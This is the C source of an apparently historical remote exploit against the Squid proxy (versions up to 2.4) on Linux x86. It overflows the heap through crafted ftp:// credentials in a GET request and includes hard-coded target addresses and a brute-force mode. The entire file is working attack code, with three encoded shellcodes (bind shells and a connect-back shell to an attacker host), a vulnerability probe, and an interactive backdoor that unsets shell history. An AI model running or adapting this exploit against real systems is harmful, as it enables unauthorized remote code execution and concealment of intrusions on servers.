/**
 ** *OLD* *OLD* *OLD* *OLD**OLD* *OLD**OLD* *OLD**OLD* *OLD**OLD* *OLD*
 **
 ** linux/x86 2.0 <= squid <= 2.4.DEVEL4 remote exploit (c) gunzip
 **
 ** to compile type 'make squidx'
 **
 ** Version 2.4STABLE(*) are vulnerable too but you have to play with
 ** USERLEN, NOPNUM, PASSLEN values to get exploit works (because of the
 ** different memory layout). Read below how to write new targets.
 **
 ** This is however a rare exploitable bug because
 **
 ** - Squid dies every time you overflow it and you have to wait > 10 sec
 ** - You can't bruteforce too much or squid will rest in peace forever
 ** - You MUST have the rights (acl) to use ftp proxying (not in default conf)
 ** - Address differs alot (return addresses) from distro to distro
 ** - Victim host must have an ftp server running to connect to
 ** - Yes, you can change the host who runs ftp server but in this way
 **   you mess up the align so the exploit won't work (have to fix this)
 **
 ** I'll put new versions if I've time on
 ** http://members.xoom.it/gunzip/
 **
 ** comments to gunzip@ircnet - mAilto: <techieone@softhome.net>
 **
 ** TODO: check align against host field, make real targets
 **
 ** Version 0.4
 **
 ** kisses to tankie
 ** greets: arcangelo, jestah, sorbo, and daphiel for testing
 **
 ** *OLD* *OLD* *OLD* *OLD**OLD* *OLD**OLD* *OLD* *OLD* *OLD* *OLD* *OLD*
**/
/**
 **  Here are the young men, well where have they been ?
 **/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <getopt.h>

char inetd_shellcode[] =
        /*
         * binds an inetd shell on port 5002 (lsd-pl.net + s-poly by zillion)
        */
        "\x4b\xeb\x11\x5e\x31\xc9\xb1\x81\x80\x6c\x0e\xff\xd4\x80\xe9"
        "\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\xbf\xf6\x2d\x05\x94"
        "\x24\x3c\x03\x03\x47\x3c\x3c\x03\x36\x3d\x42\x5d\xb7\x24\x3a"
        "\x3c\x01\x37\x5d\xbb\x24\x25\x2b\x27\x5d\xb5\x6d\x84\xdf\xa1"
        "\x54\xbc\xad\xd3\xd3\xd3\x39\x37\x3c\x43\xf4\x46\x3a\x39\xf4"
        "\x47\x48\x46\x39\x35\x41\xf4\x48\x37\x44\xf4\x42\x43\x4b\x35"
        "\x3d\x48\xf4\x46\x43\x43\x48\xf4\x03\x36\x3d\x42\x03\x47\x3c"
        "\xf4\x47\x3c\xf4\x01\x3d\x12\x03\x48\x41\x44\x03\x02\x4c\xf4"
        "\x0f\x03\x49\x47\x46\x03\x47\x36\x3d\x42\x03\x3d\x42\x39\x48"
        "\x38\xf4\x03\x48\x41\x44\x03\x02\x4c\x0f\x39\x37\x3c\x43\xf4"
        "\x4d\x39\x35\x3c";

char forking_bind[] =
        /*
         * by eSDee - www.netric.org, encoded with s-poly by zillion
        */
        "\x57\x5f\xeb\x11\x5e\x31\xc9\xb1\xc8\x80\x44\x0e\xff\x2b\x49"
        "\x41\x49\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x06\x95\x06\xb0"
        "\x06\x9e\x26\x86\xdb\x26\x86\xd6\x26\x86\xd7\x26\x5e\xb6\x88"
        "\xd6\x85\x3b\xa2\x55\x5e\x96\x06\x95\x06\xb0\x25\x25\x25\x3b"
        "\x3d\x85\xc4\x88\xd7\x3b\x28\x5e\xb7\x88\xe5\x28\x88\xd7\x27"
        "\x26\x5e\x9f\x5e\xb6\x85\x3b\xa2\x55\x06\xb0\x0e\x98\x49\xda"
        "\x06\x95\x15\xa2\x55\x06\x95\x25\x27\x5e\xb6\x88\xd9\x85\x3b"
        "\xa2\x55\x5e\xac\x06\x95\x06\xb0\x06\x9e\x88\xe6\x86\xd6\x85"
        "\x05\xa2\x55\x06\x95\x06\xb0\x25\x25\x2c\x5e\xb6\x88\xda\x85"
        "\x3b\xa2\x55\x5e\x9b\x06\x95\x06\xb0\x85\xd7\xa2\x55\x0e\x98"
        "\x4a\x15\x06\x95\x5e\xd0\x85\xdb\xa2\x55\x06\x95\x06\x9e\x5e"
        "\xc8\x85\x14\xa2\x55\x06\x95\x16\x85\x14\xa2\x55\x06\x95\x16"
        "\x85\x14\xa2\x55\x06\x95\x25\x3d\x04\x04\x48\x3d\x3d\x04\x37"
        "\x3e\x43\x5e\xb8\x60\x29\xf9\xdd\x25\x28\x5e\xb6\x85\xe0\xa2"
        "\x55\x06\x95\x15\xa2\x55\x06\x95\x5e\xc8\x85\xdb\xa2\x55\xc0"
        "\x6e";

#define IP              "\x7f\x01\x01\x01"      /* 127.1.1.1 */
#define DPORT           "\x99\x99"              /* 39321 */

char connectback_shellcode[] =
        /*
         * by gloomy - www.netric.org
        */
        "\x31\xc0\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x75\x54"
        "\x50\x40\x50\x40\x50\x89\xe1\x43\xb0\x66\xcd\x80"
        "\x4b\x53\x53\x68" IP "\x66\x68"  DPORT "\xb3\x02"
        "\x66\x53\x89\xe2\xb3\x10\x53\x52\x50\x89\xe1\xb3"
        "\x03\xb0\x66\xcd\x80\x31\xc9\x39\xc1\x75\x23\xb1"
        "\x02\xb0\x3f\xcd\x80\x49\x75\xf9\xb0\x3f\xcd\x80"
        "\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
        "\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x31\xc0"
        "\x40\xcd\x80";

#define CONNECT_BACK    0x1
#define CONNECT_TO      0x10

#define IP_OFFSET       28
#define PORT_OFFSET     34

struct hits
{
        char            * desc  ;
        char            * code  ;
        unsigned short  flag    ;
        unsigned short  port    ;
} ht[]=
{
        { "forking bind shellcode (45295)", forking_bind,
                CONNECT_TO, 45295 },
        { "binds a shell via inetd (5002)", inetd_shellcode,
                CONNECT_TO, 5002 },
        { "connects back on supplied host (39321)", connectback_shellcode,
                CONNECT_BACK, 39321 },
        { NULL, 0, 0 }
};

#define TIMEOUT         0x5

#ifndef INADDR_NONE
#define INADDR_NONE     0xffffffff
#endif

#ifndef INADDR_ANY
#define INADDR_ANY      0x00000000
#endif

#ifdef DEBUG
#define debug(x...) printf(x)
#else
#define debug(x...)
#endif

/**
 ** a little rip from teso fmtlib
 **/
#define OCT( b0, b1, b2, b3, addr )  { \
             b0 = (addr >> 24) & 0xff; \
             b1 = (addr >> 16) & 0xff; \
             b2 = (addr >>  8) & 0xff; \
             b3 = (addr      ) & 0xff; \
}

void shell( int fd )
{
        int rd ;
        fd_set rfds;
        static char buff[ 1024 ];
        char INIT_CMD[] = "unset HISTFILE; echo; id; uname -a;\n";

        if (write(fd, INIT_CMD, strlen( INIT_CMD )) < strlen(INIT_CMD)) {
                fprintf(stderr,"[-] Error sending evil commands");
                exit( EXIT_FAILURE );
        }

        while(1) {
                FD_ZERO( &rfds );
                FD_SET(0, &rfds);
                FD_SET(fd, &rfds);

                if(select(fd+1, &rfds, NULL, NULL, NULL) < 1) {
                        perror("[-] Select");
                        exit( EXIT_FAILURE );
                }
                if( FD_ISSET(0, &rfds) ) {
                        if( (rd = read(0, buff, sizeof(buff))) < 1) {
                                perror("[-] Read");
                                exit( EXIT_FAILURE );
                        }
                        if( write(fd,buff,rd) != rd) {
                                perror("[-] Write");
                                exit( EXIT_FAILURE );
                        }
                }
                if( FD_ISSET(fd, &rfds) ) {
                        if( (rd = read(fd, buff, sizeof(buff))) < 1) {
                                exit( EXIT_SUCCESS );
                        }
                        write(1, buff, rd);
                }
        }
}

unsigned long resolve( char * host )
{
        unsigned long   rev ;
        struct hostent  * he ;

        if (( rev = inet_addr( host )) != INADDR_NONE )
        {
                return rev ;
        }
        if ( (he = gethostbyname( host )) == NULL )
        {
                perror("[-] Gethostbyname");
                return -1;
        }
        else
        {
                return ((struct in_addr *)(he->h_addr))->s_addr ;
        }
}

int connect_to_host( unsigned long ip, unsigned short port )
{

        int     ret, flags, s ;
        struct  sockaddr_in     server ;

        memset( &server, 0x0, sizeof(server) );

        server.sin_port = htons ( port );
        server.sin_family = AF_INET ;
        server.sin_addr.s_addr = ip ;

        if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1 ) {
                perror("[-] Socket");
                return -1 ;
        }

        /**
         ** sets non blocking socket and connects, ripped somewhere
        **/

        if ((flags = fcntl (s, F_GETFL, 0)) == -1 ) {
                close( s );
                return -1;
        }

        if (fcntl(s, F_SETFL, flags | O_NONBLOCK) == -1) {
                close( s );
                return -1;
        }

        ret = connect(s, (struct sockaddr *)&server, sizeof(server));

        if ( ret < 0 )
        {
                if ( errno != EINPROGRESS ) {
                        close( s );
                        return -1;
                }
                else
                {
                        int                     n ;
                        struct timeval          tv = { TIMEOUT, 0 };
                        fd_set                  rset, wset;

                        FD_ZERO( &rset );
                        FD_ZERO( &wset );
                        FD_SET( s, &rset );
                        FD_SET( s, &wset );

                        if ((n = select( s + 1, &rset, &wset, NULL, &tv)) == -1 ) {
                                perror("[-] Select");
                                return -1;
                        }
                        /**
                         ** handles timeout
                         **/
                        if (n == 0) {
                                close( s );
                                fprintf(stderr,"[-] Timeout\n");
                                return -1;
                        }

                        if (FD_ISSET( s, &rset ) || FD_ISSET( s, &wset ))
                        {
                                int error = 0 ;
                                int len = sizeof( error );
                                if (getsockopt(s, SOL_SOCKET, SO_ERROR, &error, &len) == -1) {
                                        perror("[-] Getsockopt");
                                        return -1;
                                }
                                if (error != 0) {
                                        debug("[*] SO_ERROR != 0\n");
                                        return -1;
                                }
                        }
                        else
                        {
                                return -1 ;
                        }
                }
        }
        /**
         **      restores flags and returns
         **/
        if ( fcntl(s, F_SETFL, flags) == -1 )
                return -1;
        else
                return s;
}

size_t net_write( int fd, char * buf, size_t size )
{
        struct timeval  tv = { TIMEOUT, 0 };
        fd_set          wfds ;
        int             ret ;

        FD_ZERO( &wfds );
        FD_SET( fd, &wfds );

        if ( (ret = select( fd+1, NULL, &wfds, NULL, &tv )) == -1 ) {
                perror("[-] Select");
                exit( EXIT_FAILURE );
        }
        if ( ret == 0 ) {
                close( fd );
                fprintf(stderr,"[-] Timeout\n");
                exit( EXIT_FAILURE );
        }
        if ( FD_ISSET( fd, &wfds ) )
        {
                return( write( fd, buf, size ) );
        }
        else
        {
                fprintf(stderr,"[-] Error in sending data\n");
                exit( EXIT_FAILURE );
        }
}

size_t net_read( int fd, char * buf, size_t size )
{
        struct timeval  tv = { TIMEOUT, 0 };
        fd_set          rfds ;
        int             ret ;

        FD_ZERO( &rfds );
        FD_SET( fd, &rfds );

        if ( (ret = select( fd+1, NULL, &rfds, NULL, &tv )) == -1 ) {
                perror("[-] Select");
                exit( EXIT_FAILURE );
        }
        if ( ret == 0 ) {
                close( fd );
                fprintf(stderr,"[-] Timeout\n");
                exit( EXIT_FAILURE );
        }
        if ( FD_ISSET( fd, &rfds ) )
        {
                return( read( fd, buf, size ) );
        }
        else
        {
                fprintf(stderr,"[-] Error in sending data\n");
                exit( EXIT_FAILURE );
        }
}

char * make_connback_shellcode( const char * hellcode,
                                unsigned long ip,
                                unsigned short port,
                                int ip_offset,
                                int port_offset )
{
        /**
         ** ip and port MUST be in host byte order
        **/
        char a, b, c, d;
        char * hell = (char *)strdup( hellcode );

        fflush( stderr );

        if ( !hell ) {
                fprintf( stderr, "[-] Out of memory !\n");
                exit( EXIT_FAILURE );
        }

        debug("[*] Using ip=0x%.8x port=%d\n", (unsigned int)ip, port );
        /**
         ** can't contain 0x0a and 0x0d too !!
        **/
        OCT( a, b, c, d, ip );
        if  (   ( !a || !b || !c || !d ) ||
                (( a == 0xa )||( b == 0xa )||( c == 0xa )|| ( d == 0xa ))||
                (( a == 0xd )||( b == 0xd )||( c == 0xd )|| ( d == 0xd )) )
        {
                fprintf(stderr, "[-] Ip contains invalid byte(s) that can't be in the shellcode\n"
                                "[-] Change ip/shellcode and retry.\n");
                exit( EXIT_FAILURE );
        }
        if (    ( !(port & 0xff ) || !(port & 0xff00 )) ||
                ( (( port & 0xff )== 0xa ) || (( port & 0xff00 )== 0xa )) ||
                ( (( port & 0xff )== 0xd ) || (( port & 0xff00 )== 0xd )) )
        {
                fprintf(stderr, "[-] Port contains invalid byte(s) that can't be in the shellcode\n"
                                "[-] Change bindport/shellcode and retry.\n");
                exit( EXIT_FAILURE );
        }

        *(unsigned long  *)( hell + ip_offset   ) = htonl( ip );
        *(unsigned short *)( hell + port_offset ) = htons( port );

        return hell;
}
/**
 ** if you have time to add real targets send me them,
 ** I'll return to you the xpl with all new targets and fixes
**/
#define NOPNUM          800
#define USERLEN         11
#define PASSLEN         28
#define URLLEN          24

#define SMARTJUMP       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
#define MASK            0x7

#define BRUTE_START ( 0x346000 + tg[n].retloc )
#define BRUTE_END   ( 0x366000 + tg[n].retloc )

#define PORT    3128
#define DELAY   12

#define request2size(req) ( req += (sizeof( size_t ) + MASK) &~ MASK )

/**
 ** retloc :
 **     echo 0x`objdump -R /usr/sbin/squid | grep write | awk '{print $1}'`
 **
 ** retaddr:
 **     gdb squid `pidof squid` then on another console run the exploit
 **     wait for squid to segfault, if it segfaults to an address like
 **     0x08041XXX then you just have to look for nopcode just at
 **     0xRETLOC + 346000 (nops look like 0xeb27eb27)
 **
 **     ie. if your retloc is 0x080bb1f8 then just do something like
 **     (gdb) x/100000x 0x080bb1f8+345000
 **
 ** padding:
 **     if squid does not segfault on an address like 0x08XXXXXX
 **     then you have to play with lenght of password, user or url
 **/
struct options
{
        char            *       desc    ;
        unsigned long           retaddr ;
        unsigned long           retloc  ;
} tg[]=
{
        { "2.4.DEVEL4 - Debian 3.0 from src" , 0x08401ba4, 0x080bb1f8 },
        { "2.3STABLE5 - Debian 3.0 from src" , 0x0841982c, 0x080b80a8 },
        { NULL, 0, 0 }
};

void usage( char * a )
{
        fprintf( stderr, "Usage: %s -v victim [options]\n\n"
        "-v\tvictim ip or fqhn\n"
        "-p\tport to connect to (default 3128)\n"
        "-f\tdoes not check if host is vulnerable (forces exploit)\n"
        "-j\tjust check if host is vulnerable\n"
        "-i\tip address for connect back shellcode\n"
        "-P\tport of connect back shellcode\n"
        "-t\tone of the targets (for a list type -t X)\n"
        "-c\tone of the shellcodes (for a list type -c X)\n"
        "-b\tbruteforce mode\n"
        "-s\tstep for bruteforce\n"
        "-d\tdelay between attacks (12 secs default)\n"
        "-n\tnumber of nops (try 800, 1024, 1500, 2068)\n"
        "-r\treturn address (shellcode address)\n"
        "-g\taddress to be overwritten\n\n", a );
        exit( EXIT_FAILURE );
}
void show_target_list()
{
        int i;
        fprintf( stderr, "[+] TARGETS:\n\n");
        for (i = 0 ; tg[ i ].desc ; i++ )
                fprintf ( stderr, " %d - %s\n", i, tg[ i ].desc);
        printf("\n");
        exit( EXIT_FAILURE );
}
void show_code_list()
{
        int i;
        fprintf( stderr, "[+] SHELLCODES\n\n");
        for (i = 0 ; ht[ i ].desc ; i++ )
                fprintf ( stderr, " %d - %s\n", i, ht[ i ].desc   );
        printf("\n");
        exit( EXIT_FAILURE );
}

int squid_check_if_vuln( unsigned long ip, char * host )
{
        int     s ;
        char    buf[ 1024 ];
        char    pad[ 64 ];

        memset( buf, 0x0, sizeof(buf) );
        memset( pad, 0x7e, sizeof(pad) );
        pad[ 63 ]  =0;

        snprintf( buf, sizeof(buf) - 1,
                "GET ftp://%s:%s@%s/ HTTP/1.0\r\n\r\n",
                pad, pad, host );

        buf[ 1024 - 1 ] =0;

        if ( (s = connect_to_host( ip, 3128 )) == -1 )
                return 0;

        if (net_write( s, buf, strlen(buf) ) == strlen(buf)) {
                memset( buf, 0x0, sizeof(buf) );
                if( net_read( s, buf, sizeof(buf)) > 0 ) {
                        close( s );
                        return 0;
                }
                else  {
                        close( s );
                        return 1;
                }
        }
        close( s );
        return 0;
}
/**
 ** every leeto exploit MUST have dots in it
**/
void wait_dots( int s )
{
        int i;

        fprintf( stdout, "[+] Sleeping %d secs to let squid restart", s);

        for ( i=0; i <= s ; i++ )
        {
                fflush( stdout );
                fprintf(stdout, ".");
                sleep( 1 );
        }

        fprintf( stdout, "\n" );
}

int main(int argc, char *argv[])
{
        unsigned long   ip              = 0x7f000001,
                        local_ip        = 0x0,
                        retaddr         = 0x0;

        unsigned int    len, i,
                        step    = NOPNUM - 256,
                        nopnum  = NOPNUM,
                        delay   = DELAY;

        unsigned short  port    = PORT ;

        int     opt, s, n =0, c =0, brute =0, force =0;

        char    user [ 128 ];
        char    pass [ 128 ];
        char    url  [ 128 ];
        char    evil [ 4096 ];
        char    nops [ NOPNUM ];

        char    * t ;
        char    * host          = "0.0.0.0" ;
        char    * victim        = "127.0.0.1";

        fprintf(stdout, "\nlinux/x86 remote exploit against squid <= 2.4.STABLE3 by gunzip\n\n");

        if ( argc < 3 )
                usage( argv[0] );

        while ((opt = getopt(argc, argv, "n:d:i:P:jfp:c:t:v:r:g:bs:h")) != EOF) {
                switch(opt)
                {
                        case 'd': delay = atoi(optarg); break;
                        case 'n': nopnum = atoi(optarg); break;
                        case 'i': local_ip = inet_addr(optarg); break;
                        case 'P': ht[c].port = atoi(optarg); break;
                        case 'f': force=1; break;
                        case 'j': force=-1; break;
                        case 'p': port = atoi(optarg) ;
                        case 'c': if ( *optarg == 'X' ) show_code_list();
                                  else c = atoi(optarg); break;
                        case 't': if ( *optarg == 'X' ) show_target_list();
                                  else n = atoi(optarg); break;
                        case 'v': victim = strdup( optarg ); break ;
                        case 'r': tg[n].retaddr = strtoul( optarg, NULL, 16 ); break ;
                        case 'g': tg[n].retloc = strtoul( optarg, NULL, 16 ); break ;
                        case 'b': brute=1; break;
                        case 's': step=atoi(optarg); break;
                        case 'h': default: usage( "./squidx" ); break;
                }
        }
        if ( ht[c].port > 65535 || ht[c].port < 1 ) {
                fprintf(stderr, "[-] Not valid port for connect back code\n");
                return -1;
        }
        if ( ht[c].flag & CONNECT_BACK ) {
                if ( !local_ip || local_ip == -1 ) {
                        fprintf(stderr,"[-] You must supply a valid ip for connect back shellcode.\n");
                        return -1;
                }
                ht[c].code = make_connback_shellcode(   ht[c].code,
                                                        ntohl( local_ip ),
                                                        ht[c].port,
                                                        IP_OFFSET,
                                                        PORT_OFFSET
                );
        }
        if ( (ip = resolve( victim )) == -1 ) {
                fprintf(stderr, "[-] Cannot resolve victim ip\n");
                return -1;
        }
        if ( !force ) {
                if ( squid_check_if_vuln( ip, host ) )
                        fprintf(stdout, "[+] Host seems vuln !\n");
                else {
                        fprintf(stderr, "[-] Host seems not vuln, sorry.\n");
                        return -1;
                }

                if ( force == -1 )
                        return 1;

                wait_dots( 12 );
        }
        fprintf(stdout,"[+] Target %s\n", tg[n].desc);
        fprintf(stdout,"[+] Host is %s\n", victim );
        /**
         ** this is for align and overflow
         **/
        memset( user, 0x7e, USERLEN );
        user[ USERLEN ] = 0;

        memset( pass, 0x7e, PASSLEN );
        pass[ PASSLEN  ] = 0 ;

        len = 64 + strlen( user ) + strlen( pass ) + strlen( host ) + URLLEN;
        t = (char *)malloc( len );

        memset( evil, 0x00, sizeof(evil));
        memset( nops, 0xeb, sizeof(nops));
        memset( url, 0x41, sizeof(url));
        /**
         ** that's because 0x27 act as a nop
         **/
        for ( i=1; i < sizeof(nops) ; i+=2 )
                nops[ i ] = 0x27 ;

        nops[ nopnum - strlen(ht[c].code) - 8 ] = 0 ;

        snprintf( evil, sizeof(evil)-1, "Accept: %s%s%s\r\n\r\n", nops, SMARTJUMP, ht[c].code);

        for ( retaddr=(brute ? BRUTE_START : tg[n].retaddr ); retaddr <= (brute ? BRUTE_END : tg[n].retaddr ); reta
ddr += step )
        {
                memset( t, 0x0, len );

                fprintf(stdout,"[+] Using retaddr=0x%.8x retloc=0x%.8x code=%d step=%d\n",
                                (u_int)retaddr, (u_int)tg[n].retloc,
                                strlen(ht[c].code), step);

                *(long *)&url[0]        = 0x4142432f            ; /* dummy      */
                *(long *)&url[4]        = 0xfffffffc            ; /* prevsize   */
                *(long *)&url[8]        = 0xfffffffc            ; /* size field */
                *(long *)&url[12]       = 0xdeadbeef            ; /* dummy      */
                *(long *)&url[16]       = tg[n].retloc - 12     ; /* fd         */
                *(long *)&url[20]       = retaddr               ; /* bk         */
                url[ URLLEN ] = 0 ;

                debug("[*] Using host=%d user=%d url=%d pass=%d\n",
                        strlen(host), strlen(user),
                        strlen(url), strlen(pass));

                debug("[*] Using buffer_len=%d real_malloced_size=%d\n",
                        len, request2size( len ));

                strcat( t, "GET " );
                strcat( t, "ftp://" );
                strcat( t, user );
                strcat( t, ":" );
                strcat( t, pass );
                strcat( t, "@" );
                strcat( t, host );
                strcat( t, url );
                strcat( t, " HTTP/1.0\r\n" );

                debug("[*] Using string=%d evil=%d\n", strlen(t), strlen(evil));

                if ( (s = connect_to_host( ip, 3128 )) == -1 ) {
                        fprintf(stderr, "[-] Could not connect to host %s\n", victim );
                        return -1;
                }

                net_write( s, t, strlen(t) );
                net_write( s, evil, strlen(evil) );

                if (( brute ) && !(brute++ % 5) )
                        wait_dots( 22 );
                else
                        wait_dots( 12 );

                close( s );
                sleep( 1 );

                if ( ht[c].flag & CONNECT_TO )
                {
                        int y = connect_to_host( ip, ht[c].port );
                        fprintf( stdout, "[+] Trying connecting to the backdoor\n");
                        if ( y > 0 ) shell( y );
                }
                fprintf(stdout, "[+] I did not work.\n");
        }

        return 1;
}


